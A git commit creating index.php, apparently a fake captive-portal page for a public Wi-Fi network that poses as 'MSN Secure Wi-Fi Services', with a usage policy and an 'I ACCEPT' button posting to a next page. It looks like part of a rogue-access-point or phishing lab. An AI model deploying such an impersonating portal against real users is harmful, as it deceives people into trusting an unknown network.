418a03db9e7f894dcdf502c4a6c0d76789c7ef00
Mahip <kcmahip@gmail.com>
2018-12-07 15:15:37 +0530

    Create index.php

---
+++ var/www/html/index.php
@@ -0,0 +1,58 @@
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<!DOCTYPE HTML PUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Public Wi-Fi Internet </title>
+<style type="text/css">
+body {
+background-image: url(./linus.png);            
+background-size: 100%; 
+background-origin: content;
+background-repeat: no-repeat;
+font-family: Verdana, Arial, Helvetica, sans-serif;
+font-size: 18px;
+background-color: #FFFFFF;
+margin: 10px;
+padding: 10px;
+}
+h2 { font-size: 25px; font-weight: bold; color:black}
+h3 { font-size: 14px; font-weight: bold; }
+p, ul, li, input { }
+</style>
+</head>
+<body>
+<h1 align="center" style="color:blue;font-size:25;"><marquee behavior="scroll" direction=left scrolldelay="100">Welcome to MSN Secure Wi-Fi Services.</marquee><hr/><br/></h1>
+<h2 align="center"><u>WiFi Access Usage Policy:</u></h2>
+<br/><br/>
+<p>
+<b>This Policy is a guide to the acceptable use of MSN Secure Wi-Fi Services</b> 
+<br/><br/>
+Any individual connected to the Guest Wireless Network in order to use it directly or to connect to any other network(s), must comply with this policy,
+the stated purposes and Acceptable Use policies of any other network(s) or host(s) used, and all applicable laws, rules, and regulations.
+<br/><br/>
+<b>MSN Secure Wi-Fi Service</b> provides one of the best shared WiFi security.     We believe in ensuring that all the clients connected in this shared Wi-Fi can have a secure browsing experience.
+In order to get the secured <b>WIFI</b> connection you will be redirected to our next page in which you will be asked to select the web-pages you want to visit during  the session.If you wish to add any  other then your preferences then you have to logout and login again.
+</p>
+<ul>
+<li>Users must respect the privacy and intellectual property rights of others.</li>
+<li>Users must respect the integrity of our network and any other public or private computing and network systems.</li>
+<li>Use of the Guest Wireless Network for malicious, fraudulent, or misrepresentative purposes is prohibited.</li>
+<li>The Guest Wireless Network may not be used in a manner that precludes or hampers other users access to the Guest Wireless Network or other
+any other networks.</li>
+<li>Nothing may be installed or used that modifies, disrupts, or interferes in any way with service for any user, host, or network.</li>
+</ul>
+<br><br>
+<b>CLICK ON THE BUTTON BELOW TO GO THE ANOTHER PAGE</b></font></div>
+<div align="center">
+<br><br><br>
+<form name="form1" method="post" action="index1.php">
+<span class="bodytext">
+<input type="hidden" id="email" name="email" type="text" value="user@company.com" class="text" accesskey="e" />
+<input type="hidden" name="cmd" value="authenticate" />
+<input type="submit" name="Login" value="I ACCEPT" class="button" />
+</span>
+</form>
+</div>
+</body>
+</html>
+
